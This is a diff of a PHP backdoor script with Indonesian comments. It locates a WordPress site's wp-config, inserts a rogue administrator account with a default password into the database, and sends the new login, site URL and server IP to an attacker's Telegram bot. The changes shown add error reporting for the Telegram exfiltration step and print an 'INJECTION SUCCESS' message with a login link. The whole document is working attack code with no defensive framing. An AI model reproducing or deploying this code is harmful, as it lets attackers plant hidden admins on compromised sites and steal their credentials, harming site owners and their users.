@@ -8,10 +8,7 @@ $user  = $_POST['wp_user']  ?? 'subadmin';
 $pass  = $_POST['wp_pass']  ?? 'Asdf1234@@';
 $email = $_POST['wp_email'] ?? 'admin@' . $_SERVER['HTTP_HOST'];
 
-// =============================================
-// AUTO DETECT SUBDOMAIN
-// =============================================
-$target_subdomain = 'bloglegalcops';   // GANTI kalau foldernya beda
+$target_subdomain = 'bloglegalcops';
 
 $currentDir = dirname(__FILE__);
 $found_config = false;
@@ -35,7 +32,6 @@ foreach ($paths_to_check as $path) {
     }
 }
 
-// Fallback scan
 if (!$found_config) {
     $search_path = $currentDir;
     for ($i = 0; $i < 12; $i++) {
@@ -71,24 +67,19 @@ if ($found_config) {
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}user_level', '10')");
 
-            // === LOGIN URL DARI DATABASE (PALING PENTING) ===
+            // Login URL dari DB
             $siteurl_result = $conn->query("SELECT option_value FROM `{$prefix}options` WHERE option_name = 'siteurl' LIMIT 1");
-            
             $login_url = "";
             if ($siteurl_result && $siteurl_result->num_rows > 0) {
                 $row = $siteurl_result->fetch_assoc();
                 $siteurl = rtrim($row['option_value'], '/');
                 $login_url = $siteurl . "/wp-login.php";
-            } 
-            
-            // Fallback kalau siteurl kosong
-            if (empty($login_url)) {
+            } else {
                 $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
-                $domain = $_SERVER['HTTP_HOST'];
-                $login_url = $protocol . $domain . "/wp-login.php";
+                $login_url = $protocol . $_SERVER['HTTP_HOST'] . "/wp-login.php";
             }
 
-            // Telegram Notification
+            // === TELEGRAM DENGAN DEBUG LENGKAP ===
             $text = "💎 *INI YA LOGINAN WP NYA!* 💎\n\n";
             $text .= "👤 *User:* " . $user . "\n";
             $text .= "🔑 *Pass:* " . $pass . "\n";
@@ -98,17 +89,38 @@ if ($found_config) {
             $text .= "🛰 *IP:* " . ($_SERVER['SERVER_ADDR'] ?? 'unknown') . "\n";
             $text .= "📅 *Time:* " . date('Y-m-d H:i:s') . "\n";
 
-            $ch = curl_init("https://api.telegram.org/bot" . $botToken . "/sendMessage");
+            $telegram_url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
+            $postData = [
+                'chat_id' => $chatId,
+                'text' => $text,
+                'parse_mode' => 'Markdown'
+            ];
+
+            $ch = curl_init($telegram_url);
             curl_setopt($ch, CURLOPT_POST, true);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'Markdown']);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
             curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-            curl_exec($ch);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+            $result = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $curl_error = curl_error($ch);
             curl_close($ch);
 
-            echo "✅ <b>SUCCESS!</b> Admin '$user' berhasil di-inject!<br>";
-            echo "🔗 <a href='$login_url' target='_blank'>Login Sekarang</a><br>";
+            // Tampilkan status Telegram di browser
+            if ($result === false) {
+                $telegram_status = "❌ CURL Error: " . $curl_error;
+            } elseif ($http_code != 200) {
+                $telegram_status = "❌ Telegram Failed (HTTP $http_code): " . htmlspecialchars($result);
+            } else {
+                $telegram_status = "✅ Telegram Berhasil Dikirim!";
+            }
+
+            echo "✅ <b>INJECTION SUCCESS!</b> Admin '$user' berhasil dibuat!<br><br>";
+            echo "🔗 <a href='$login_url' target='_blank'>Login Sekarang</a><br><br>";
+            echo "<b>Telegram Status:</b> " . $telegram_status . "<br>";
             echo "<small>wp-config: " . htmlspecialchars($found_config) . "</small>";
+
         } else {
             echo "ERROR Query: " . $conn->error;
         }
